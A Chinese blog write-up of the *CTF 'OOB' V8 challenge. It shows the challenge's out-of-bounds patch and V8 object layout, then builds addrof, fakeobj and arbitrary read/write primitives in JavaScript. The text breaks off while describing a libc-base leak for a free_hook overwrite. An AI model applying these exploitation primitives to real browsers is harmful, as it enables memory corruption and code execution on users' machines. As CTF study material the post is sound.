<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="v8-oob"><meta name="keywords" content="v8,浏览器"><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><title>v8-oob | 张三的博客</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '5.4.2'
} </script><meta name="generator" content="Hexo 5.4.2"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF-OOB"><span class="toc-number">1.</span> <span class="toc-text">*CTF OOB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">题目介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.</span> <span class="toc-text">题目环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.3.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#v8%E5%AF%B9%E8%B1%A1%E7%BB%93%E6%9E%84"><span class="toc-number">1.3.1.</span> <span class="toc-text">v8对象结构</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AF%94%E8%BE%83%E7%AE%80%E5%8D%95%E7%9A%84%EF%BC%8C%E4%BF%AE%E6%94%B9free-hook%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.5.1.</span> <span class="toc-text">比较简单的，修改free_hook的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5shellcode"><span class="toc-number">1.5.2.</span> <span class="toc-text">写入shellcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.6.</span> <span class="toc-text">exp:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9free-hook%E7%89%88"><span class="toc-number">1.6.1.</span> <span class="toc-text">修改free_hook版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode%E7%89%88"><span class="toc-number">1.6.2.</span> <span class="toc-text">shellcode版</span></a></li></ol></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">John Doe</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">1</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">2</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">1</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">张三的博客</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">首页</a><a class="site-page" href="/archives/">时间轴</a><a class="site-page" href="/tags/">标签</a><a class="site-page" href="/categories/">分类</a><a class="site-page" href="/about/">关于</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a></span></div><div id="post-info"><div id="post-title">v8-oob</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-06-15</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/chrome-pwn/">chrome pwn</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>我的第一个v8漏洞</p>
<span id="more"></span>
<h1 id="CTF-OOB"><a href="#CTF-OOB" class="headerlink" title="*CTF OOB"></a>*CTF OOB</h1><h2 id="题目介绍"><a href="#题目介绍" class="headerlink" title="题目介绍"></a>题目介绍</h2><p>来自*CTF的v8 pwn题，漏洞点比较简单，利用起来也不是很复杂，比较适合作为v8的入门</p>
<h2 id="题目环境搭建"><a href="#题目环境搭建" class="headerlink" title="题目环境搭建"></a>题目环境搭建</h2><p>v8是由google开发的java script引擎。由于特殊条件的限制，我们如果想要对它进行分析研究，就需要使用一些科学手段。科学手段操作方法这里不多讲了，参见下面的链接。<br><a target="_blank" rel="noopener" href="https://mem2019.github.io/jekyll/update/2019/07/18/V8-Env-Config.html">https://mem2019.github.io/jekyll/update/2019/07/18/V8-Env-Config.html</a><br>配置完后，调整到对应v8版本并应用题目给的patch。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line">gclient <span class="built_in">sync</span></span><br><span class="line">git apply ../oob.diff</span><br><span class="line"></span><br><span class="line">./tools/dev/v8gen.py x64.release</span><br><span class="line">ninja -C ./out.gn/x64.release</span><br><span class="line"></span><br><span class="line">./tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C ./out.gn/x64.debug</span><br></pre></td></tr></table></figure>
<p>其中debug版本中存在检查，触发本题的漏洞时会做检查然后直接崩溃，这里编译出来只是为了看v8的一些内存结构，漏洞触发和调试均放在release版本上。</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="v8对象结构"><a href="#v8对象结构" class="headerlink" title="v8对象结构"></a>v8对象结构</h3><p>js作为一个面向对象的语言，它的变量都是用类表示的。并且由于js是一个动态语言，它的类的成员是可以变得，这就导致它类的内存结构和C那些不太一样，复杂很多。<br>v8下类的派生结构图：</p>
<img src="/2022/06/15/v8-oob/paishen.webp" class="">
<p>在v8里，js类的一般结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[ class / map ] -&gt; ... ; 指向内部类或者数组对象的map对象</span><br><span class="line">[ properties  ] -&gt; [empty array]</span><br><span class="line">[ elements    ] -&gt; [empty array] ; 数值类型名称的属性</span><br><span class="line">[ reserved #1 ] -\</span><br><span class="line">[ reserved #2 ]  |</span><br><span class="line">[ reserved #3 ]  &#125;- in object properties,即预分配的内存空间</span><br><span class="line">...............  |</span><br><span class="line">[ reserved #N ] -/</span><br></pre></td></tr></table></figure>
<p>我们来用debug版的v8看看实际情况下是个什么情况<br>写一个测试用的js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>
<p>以arraybuffer为例<br>arraybuffer的结构：</p>
<img src="/2022/06/15/v8-oob/arraybuffer.PNG" class="">
<p>gdb看的内存：</p>
<img src="/2022/06/15/v8-oob/neicun.PNG" class="">
<p>注意那个地址的最后，它的值看起来不是对齐的。这是因为v8里有个tagged pointer机制，一个地址指向的如果不是SMI（就是小整数)，它的最低位就会打上一个标记，就会有个1，看起来就不是对齐的，用的时候要减1。</p>
<p>在v8的类结构里面，和本题关系比较大的是map这个元素。这个元素简单来说就是v8用来指示这个对象里的数据如何被解析的。要注意的是v8解析对象类型靠的就是它，也就是说如果你能改变它，你就能让v8错误地解析一个对象。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>题目提供了一个patch文件，给我们造了个漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span><br><span class="line">index b027d36..ef1002f <span class="number">100644</span></span><br><span class="line">--- a/src/bootstrapper.cc</span><br><span class="line">+++ b/src/bootstrapper.cc</span><br><span class="line">@@ <span class="number">-1668</span>,<span class="number">6</span> +<span class="number">1668</span>,<span class="number">8</span> @@ <span class="type">void</span> <span class="title function_">Genesis::InitializeGlobal</span><span class="params">(Handle&lt;JSGlobalObject&gt; global_object,</span></span><br><span class="line"><span class="params">                           Builtins::kArrayPrototypeCopyWithin, <span class="number">2</span>, <span class="literal">false</span>)</span>;</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, <span class="string">&quot;fill&quot;</span>,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, <span class="string">&quot;oob&quot;</span>,</span><br><span class="line">+                          Builtins::kArrayOob,<span class="number">2</span>,<span class="literal">false</span>);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, <span class="string">&quot;find&quot;</span>,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, <span class="string">&quot;findIndex&quot;</span>,</span><br><span class="line">diff --git a/src/builtins/builtins-<span class="built_in">array</span>.cc b/src/builtins/builtins-<span class="built_in">array</span>.cc</span><br><span class="line">index <span class="number">8</span>df340e.<span class="number">.9</span>b828ab <span class="number">100644</span></span><br><span class="line">--- a/src/builtins/builtins-<span class="built_in">array</span>.cc</span><br><span class="line">+++ b/src/builtins/builtins-<span class="built_in">array</span>.cc</span><br><span class="line">@@ <span class="number">-361</span>,<span class="number">6</span> +<span class="number">361</span>,<span class="number">27</span> @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   <span class="keyword">return</span> *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  <span class="comment">// namespace</span></span><br><span class="line">+BUILTIN(ArrayOob)&#123;</span><br><span class="line">+    <span class="type">uint32_t</span> len = args.length();</span><br><span class="line">+    <span class="keyword">if</span>(len &gt; <span class="number">2</span>) <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+    Handle&lt;JSArray&gt; <span class="built_in">array</span> = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+    FixedDoubleArray elements = FixedDoubleArray::cast(<span class="built_in">array</span>-&gt;elements());</span><br><span class="line">+    <span class="type">uint32_t</span> length = static_cast&lt;<span class="type">uint32_t</span>&gt;(<span class="built_in">array</span>-&gt;length()-&gt;Number());</span><br><span class="line">+    <span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">+        <span class="comment">//read</span></span><br><span class="line">+        <span class="keyword">return</span> *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span><br><span class="line">+    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">+        <span class="comment">//write</span></span><br><span class="line">+        Handle&lt;Object&gt; value;</span><br><span class="line">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(<span class="number">1</span>)));</span><br><span class="line">+        elements.<span class="built_in">set</span>(length,value-&gt;Number());</span><br><span class="line">+        <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span><br><span class="line">index <span class="number">0447230.</span>.f113a81 <span class="number">100644</span></span><br><span class="line">--- a/src/builtins/builtins-definitions.h</span><br><span class="line">+++ b/src/builtins/builtins-definitions.h</span><br><span class="line">@@ <span class="number">-368</span>,<span class="number">6</span> +<span class="number">368</span>,<span class="number">7</span> @@ namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   <span class="comment">/* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */</span>   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line">+  CPP(ArrayOob)                                                                \</span><br><span class="line">                                                                                \</span><br><span class="line">   <span class="comment">/* ArrayBuffer */</span>                                                            \</span><br><span class="line">   <span class="comment">/* ES #sec-arraybuffer-constructor */</span>                                        \</span><br><span class="line">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span><br><span class="line">index ed1e4a5..c199e3a <span class="number">100644</span></span><br><span class="line">--- a/src/compiler/typer.cc</span><br><span class="line">+++ b/src/compiler/typer.cc</span><br><span class="line">@@ <span class="number">-1680</span>,<span class="number">6</span> +<span class="number">1680</span>,<span class="number">8</span> @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       <span class="keyword">return</span> Type::Receiver();</span><br><span class="line">     <span class="keyword">case</span> Builtins::kArrayUnshift:</span><br><span class="line">       <span class="keyword">return</span> t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line">+    <span class="keyword">case</span> Builtins::kArrayOob:</span><br><span class="line">+      <span class="keyword">return</span> Type::Receiver();</span><br><span class="line"> </span><br><span class="line">     <span class="comment">// ArrayBuffer functions.</span></span><br><span class="line">     <span class="keyword">case</span> Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure>
<p>重点关注builtins-array.cc里面的改动，另外两个文件的改动只是为了让它正常工作。</p>
<p>这一段改动主要给array对象造了这么一个oob方法，功能为：<br>1、当参数只有一个（即我们在调用的时候什么也不传，因为所有方法都会有个this指针作为默认参数），就返回数组最后一个元素之后的元素<br>2、当参数有两个（即我们在调用的时候传一个参数），就用我们传入的参数覆盖数组最后一个元素之后的元素<br>3、其他情况下返回一个undefined</p>
<p>那么它返回和覆盖的究竟是个什么呢<br>我们用gdb调试看看</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>
<img src="/2022/06/15/v8-oob/jsarray.PNG" class="">
<p>箭头指向的是数组数据真正存放的地方，我们看看这片区域里有啥</p>
<img src="/2022/06/15/v8-oob/mem1.PNG" class="">
<p>开头是的0x10是指向properties的指针和数组信息位，然后是数组的是个元素，然后在元素的后面，就是红圈圈着的那个，是指向数组对象map对象的指针。也就是说，这个oob方法能返回给我们数组对象的map，还能让我们修改它。</p>
<p>前面说过，map是v8用来判断对象类别的，我们能修改它，就能引起v8的类别混淆。这有什么用呢？我们用另外一个数组来说明</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj1 = &#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1.1</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> obj2 = &#123;<span class="string">&#x27;b&#x27;</span>:<span class="number">2.2</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> a = [obj1,obj2];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>
<img src="/2022/06/15/v8-oob/mem2.PNG" class="" title="avatar">

<img src="/2022/06/15/v8-oob/mem3.PNG" class="" title="avatar">
<p>可以看到这个用对象当元素的数组在结构上和前面那个浮点数组其实差不多，看内存，存储的都是一串浮点数，区别在于其解析方式。那么如果我们把浮点数组的map改成对象数组的，我们就能在浮点数组的元素所指向的地方伪造一个对象，反过来我们就能得到一个对象的地址，这就是类型混淆所能带来的功效。</p>
<p>按照上面的分析，我们来编写利用。首先是实现利用类型混淆来伪造对象和读取对象地址。</p>
<p>先写个类型转换方便后面利用，v8存储都是用浮点数（除了小整形），不能直接读，我们也不能直接写，要用函数转换。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function hex(i)</span><br><span class="line">&#123;</span><br><span class="line">    return &#x27;0x&#x27;+i.toString(16).padStart(16, &quot;0&quot;);</span><br><span class="line">&#125;</span><br><span class="line">const MAX_ITERATIONS = 10000;</span><br><span class="line">class Memory&#123;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        this.buf = new ArrayBuffer(8);</span><br><span class="line">        this.f64 = new Float64Array(this.buf);</span><br><span class="line">        this.u32 = new Uint32Array(this.buf);</span><br><span class="line">        this.bytes = new Uint8Array(this.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    f2i(val)&#123;</span><br><span class="line">        this.f64[0] = val;</span><br><span class="line">        let tmp = Array.from(this.u32);</span><br><span class="line">        return tmp[1] * 0x100000000 + tmp[0];</span><br><span class="line">    &#125;</span><br><span class="line">    i2f(val)&#123;</span><br><span class="line">        let tmp = [];</span><br><span class="line">        tmp[0] = parseInt(val % 0x100000000);</span><br><span class="line">        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);</span><br><span class="line">        this.u32.set(tmp);</span><br><span class="line">        return this.f64[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">let mem = new Memory();</span><br></pre></td></tr></table></figure>
<p>然后是类型混淆的部分</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">let float_array = [1.1,2.2,3.3,4.4];</span><br><span class="line">let obj = &#123;&#x27;a&#x27;:1.1&#125;;</span><br><span class="line">let obj_array = [obj];</span><br><span class="line">let float_map = float_array.oob()</span><br><span class="line">let obj_map = obj_array.oob();</span><br><span class="line">let maxSize = 1028 * 8;</span><br><span class="line">function addrof(obj)</span><br><span class="line">&#123;</span><br><span class="line">  obj_array[0] = obj;</span><br><span class="line">  obj_array.oob(float_map);</span><br><span class="line">  let addr = mem.f2i(obj_array[0])</span><br><span class="line">  obj_array.oob(obj_map);</span><br><span class="line">  return addr;</span><br><span class="line">&#125;</span><br><span class="line">function fakeobj(addr)</span><br><span class="line">&#123;</span><br><span class="line">  float_array[0] = mem.i2f(addr);</span><br><span class="line">  float_array.oob(obj_map);</span><br><span class="line">  let fake = float_array[0];</span><br><span class="line">  float_array.oob(float_map);</span><br><span class="line">  return fake;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里就是照上面的思路，用修改map指针的方式来实现读取对象的地址和伪造对象。有了这两个功能还不够，我们要做v8的漏洞利用一般都需要搞出来任意地址读写。</p>
<p>任意地址写照上面的思路好写，伪造对象修改对象属性即可。那任意地址读怎么办呢</p>
<p>我们可以使用伪造结构的方式，来伪造出一个浮点数组来。如果我们在一个长度为4的浮点数组元素区上方0x20位置伪造一个对象，那么这个数组的第一个元素就是map指针，第三个元素就是这个伪造对象的元素区指针，把它改成我们想要的目标就能读取目标地址处的值了。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arb_Buffer = [float_map,<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead</span>(<span class="params">addr</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (addr % <span class="number">2</span> == <span class="number">0</span>) </span><br><span class="line">  &#123;</span><br><span class="line">    addr += <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> <span class="variable constant_">OBJ</span> = <span class="title function_">fakeobj</span>(<span class="title function_">addrof</span>(arb_Buffer)-<span class="number">0x20</span>);</span><br><span class="line">  arb_Buffer[<span class="number">2</span>] = mem.<span class="title function_">i2f</span>(addr - <span class="number">0x10</span>);</span><br><span class="line">  <span class="keyword">let</span> result = mem.<span class="title function_">f2i</span>(<span class="variable constant_">OBJ</span>[<span class="number">0</span>]);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*]value at &quot;</span>+<span class="title function_">hex</span>(addr)+<span class="string">&quot; is &quot;</span>+<span class="title function_">hex</span>(result));</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而任意地址读一开始想法如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">backstoreWrite</span>(<span class="params">addr,value</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> <span class="variable constant_">OBJ</span> = <span class="title function_">fakeobj</span>(<span class="title function_">addrof</span>(arb_Buffer)-<span class="number">0x20</span>);</span><br><span class="line">  arb_Buffer[<span class="number">2</span>] = mem.<span class="title function_">i2f</span>(addr - <span class="number">0x10</span>);</span><br><span class="line">  <span class="variable constant_">OBJ</span>[<span class="number">0</span>] = mem.<span class="title function_">i2f</span>(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但这样在写某些地址时会报错，具体原因我也不知道，应该和map指针的其他机制有关。于是以这个函数为基础，又使用dataview和arraybuffer的backingstore来实现了另一个任意地址写（backingstore类似于数组的element，在v8中也是任意地址写的常用方法）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">arbWrite</span>(<span class="params">addr,value</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">  <span class="keyword">let</span> view = <span class="keyword">new</span> <span class="title class_">DataView</span>(buf);</span><br><span class="line">  <span class="keyword">let</span> backingsotre = <span class="title function_">addrof</span>(buf)+<span class="number">0x20</span>;</span><br><span class="line">  <span class="title function_">backstoreWrite</span>(backingsotre,addr);</span><br><span class="line">  view.<span class="title function_">setBigInt64</span>(<span class="number">0</span>,<span class="title class_">BigInt</span>(value),<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有了任意地址读写，就能开始利用了</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="比较简单的，修改free-hook的方法"><a href="#比较简单的，修改free-hook的方法" class="headerlink" title="比较简单的，修改free_hook的方法"></a>比较简单的，修改free_hook的方法</h3><p>一般来说我们做pwn，要控制指令流方法就这么几个。这一题我们可以改freehook，也能rop。这里将比较简单的覆盖free_hook的方法<br>首先，我们需要libc基址。在做别的题的时候，我曾经见过一个通过大量释放堆块，然后在堆块中搜索mainarena地址来得到libc基址的方法。但由于v8的垃圾回收基址，这方法不确定性比较大，而且费时间。于是我就想有没有稳定的方法，然后找到了下面这个方法</p>
<p>这个方法是利用v8浮点数组对象的一个特性，简单来说就是里面存在一条链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array-&gt;array.constructor+0x30-&gt;addr of codes </span><br></pre></td></tr></table></figure>
<p>在数组的constructor对象地址偏移0x30的地方，稳定存放着和数组初始化有关的v8引擎代码的地址。通过这个地址，我们能得到程序的基址，算出got表地址，通过读取got表我们就能得到libc中函数的地址，从而算出libc基址</p>
